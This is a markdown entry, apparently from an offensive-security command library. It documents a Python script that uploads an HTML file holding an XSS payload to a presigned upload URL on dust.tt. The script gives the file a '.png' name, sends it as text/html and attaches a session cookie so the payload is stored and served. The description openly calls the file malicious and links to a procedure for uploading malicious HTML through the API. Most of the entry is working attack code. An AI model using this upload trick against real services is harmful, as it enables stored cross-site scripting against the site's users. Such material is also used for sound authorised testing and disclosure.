---
id: 123e4567-e89b-12d3-a456-426614174006
data: >-
  from requests_toolbelt.multipart.encoder import MultipartEncoder

  import requests

  upload_url = '<from_previous_response>'

  with open('Dust/xss.html', 'rb') as f:
      m = MultipartEncoder(fields={'file': ('xss_poc.png', f, 'text/html')})
  headers = {'Content-Type': m.content_type, 'Origin': 'https://dust.tt',
  'Accept': '*/*'}

  cookies = {'appSession': '<dummy_account_session>'}

  response = requests.post(upload_url, headers=headers, cookies=cookies, data=m)

  print(response.json())

  output: null

  created_at: 2023-10-01T00:00:00Z

  updated_at: 2023-10-01T00:00:00Z

  platforms: [
    "Web"
  ]

  tags: [
    "upload",
    "multipart"
  ]

  ---
tags:
  - upload
  - multipart
type: command
output: null
executor: python
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.213Z'
verified: false
validated: true
submitted: true
---
# upload-html-file-multipart

## Command

```python
from requests_toolbelt.multipart.encoder import MultipartEncoder
import requests
upload_url = '<from_previous_response>'
with open('Dust/xss.html', 'rb') as f:
    m = MultipartEncoder(fields={'file': ('xss_poc.png', f, 'text/html')})
headers = {'Content-Type': m.content_type, 'Origin': 'https://dust.tt', 'Accept': '*/*'}
cookies = {'appSession': '<dummy_account_session>'}
response = requests.post(upload_url, headers=headers, cookies=cookies, data=m)
print(response.json())
```

## Description

This command uploads the malicious HTML file using multipart form data to the presigned URL obtained from the initial request, enabling storage of the XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| upload_url | Presigned URL from API response | Yes |
| file | Path to HTML file (e.g., 'Dust/xss.html') | Yes |
| headers | Includes Content-Type from encoder, Origin, Accept | Yes |
| cookies | Authentication session | Yes |

## Examples

### Basic Usage

```python
response = requests.post(upload_url, headers=headers, cookies=cookies, data=m)
```

### Advanced Usage

Handle file reading errors:

```python
try:
    with open('Dust/xss.html', 'rb') as f:
        # ...
except FileNotFoundError:
    print('File not found')
```

## Expected Output

JSON response like {"file": {"downloadUrl": "https://...", ...}} with the viewable file URL.

## Related

- [[commands/request-upload-url]]
- [[procedures/Upload-Malicious-HTML-File-via-API]]
